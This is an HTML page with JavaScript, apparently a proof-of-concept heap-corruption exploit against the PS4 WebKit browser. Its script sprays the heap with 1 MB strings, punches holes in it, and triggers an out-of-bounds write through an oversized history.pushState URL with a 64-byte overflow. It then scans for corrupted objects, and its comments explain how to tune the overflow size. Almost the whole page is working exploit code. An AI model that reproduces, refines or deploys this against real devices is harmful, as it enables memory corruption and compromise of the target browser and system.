<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Heap: Surgical Test</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff41; font-family: monospace; padding: 20px; font-size: 14px; }
        h2 { border-bottom: 1px solid #333; padding-bottom: 10px; }
        button { 
            background: #222; color: #fff; border: 1px solid #555; 
            padding: 15px 30px; font-size: 18px; cursor: pointer; margin-top: 20px;
        }
        button:hover { background: #444; }
        .log-entry { margin-bottom: 4px; border-left: 2px solid #333; padding-left: 10px; }
        .info { color: #88f; border-color: #88f; }
        .warn { color: #fa0; border-color: #fa0; }
        .success { color: #fff; background-color: #b00; padding: 10px; font-weight: bold; border: 2px solid #f00; }
    </style>
</head>
<body>

<h2>WebKit Heap: Surgical Corruption Test (64 Bytes)</h2>
<p>Target: Overwrite adjacent object header without crashing the Kernel.</p>
<p><strong>Config:</strong> Base: 709,522 bytes | Overflow: 64 bytes | Pattern: 'Q' (0x51)</p>

<button onclick="startTest()">INICIAR TESTE CIRÚRGICO</button>

<div id="log" style="margin-top: 20px; font-family: 'Courier New', monospace;"></div>

<script>
    // --- CONFIGURAÇÃO DO HEAP FENG SHUI ---
    // Mantemos 1MB pois foi onde você obteve o crash (sinal de colisão)
    const MB = 1024 * 1024;
    const VICTIM_SIZE = MB; 
    const SPRAY_COUNT = 512; 
    
    var victims = new Array(SPRAY_COUNT);
    
    function log(msg, type="") {
        const el = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        el.innerHTML = `<div class="log-entry ${type}">[${time}] ${msg}</div>` + el.innerHTML;
    }

    // Cria a Vítima (String de 1MB preenchida com 'B')
    function createVictim(index) {
        // Header identificável: ID:xxx-
        const header = `ID:${index}-`;
        // Preenche o resto com 'B' (0x42)
        const padding = "B".repeat(VICTIM_SIZE - header.length);
        return header + padding;
    }

    function heapSpray() {
        log(`[1/4] Alocando ${SPRAY_COUNT} objetos de 1MB (Spray)...`, "info");
        try {
            for (let i = 0; i < SPRAY_COUNT; i++) {
                victims[i] = createVictim(i);
            }
            log("[1/4] Memória preenchida e alinhada.");
            setTimeout(punchHoles, 500);
        } catch (e) {
            log("Erro fatal de OOM: " + e.message, "warn");
        }
    }

    function punchHoles() {
        log(`[2/4] Criando buracos (Holes) para a armadilha...`, "info");
        let holes = 0;
        // Padrão de furos espaçados para estabilidade
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
            victims[i] = null;
            holes++;
        }
        
        // Força Garbage Collector para consolidar os buracos
        for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }
        
        log(`[2/4] ${holes} buracos prontos. Estabilizando Heap...`);
        setTimeout(triggerExploit, 2000);
    }

    function triggerExploit() {
        log(`[3/4] Disparando Payload CIRÚRGICO (64 Bytes)...`, "warn");
        
        // --- PAYLOAD DE PRECISÃO ---
        const SAFE_SIZE = 709522; 
        
        // TENTATIVA: Apenas 64 bytes de overflow
        // Se ainda crashar, reduza para 16 bytes.
        // Se não acontecer nada, aumente para 128 bytes.
        const OVERFLOW_SIZE = 64; 
        
        const base = "A".repeat(SAFE_SIZE);
        // Usamos 'Q' (0x51) para ser muito visível se aparecer
        const overflow = "Q".repeat(OVERFLOW_SIZE);
        
        const payload = "/" + base + overflow;

        try {
            // Executa history.pushState
            history.pushState({}, "poc", payload);
            
            // Se chegarmos aqui sem crash imediato, verificamos rápido!
            log("[3/4] Trigger enviado! Verificando danos em 50ms...");
            setTimeout(checkSuccess, 50);
        } catch(e) {
            log("Erro capturado no trigger: " + e.message);
        }
    }

    function checkSuccess() {
        log(`[4/4] Varrendo memória por 'Q' (0x51)...`, "info");
        let found = false;

        // Varre as vítimas procurando corrupção
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                
                // VERIFICAÇÃO DE CORRUPÇÃO
                // Se o primeiro caractere não for mais 'I' (do ID:...), algo aconteceu.
                
                // Checa se virou 'Q' (0x51) - Sucesso Total
                if (v.charCodeAt(0) === 81) { 
                    log(`⚡ SUCESSO CRÍTICO! Vítima ID ${i} sobrescrita com 'Q'!`, "success");
                    log(`Endereço da memória violado. POC Confirmada.`, "success");
                    found = true;
                    alert("POC SUCCESS! OOB WRITE CONFIRMED!"); // Alerta visual para foto
                    break; 
                }

                // Checa se o tamanho mudou (Corrupção de Header)
                if (v.length !== VICTIM_SIZE) {
                    log(`⚡ SUCESSO PARCIAL! Vítima ID ${i} header corrompido.`, "success");
                    log(`Novo tamanho: ${v.length}`, "success");
                    found = true;
                }
            }
        }

        if (!found) {
            log("Resultado: Nenhuma corrupção detectada com 64 bytes.");
            log("Diagnóstico: O overflow foi muito curto para cruzar o padding.");
            log("Ação: Edite o arquivo e mude OVERFLOW_SIZE para 128 ou 256.");
        }
    }

    function startTest() {
        document.getElementById('log').innerHTML = "";
        document.getElementById('status').innerText = "Running...";
        heapSpray();
    }
</script>

<p id="status" style="display:none"></p>
</body>
</html>
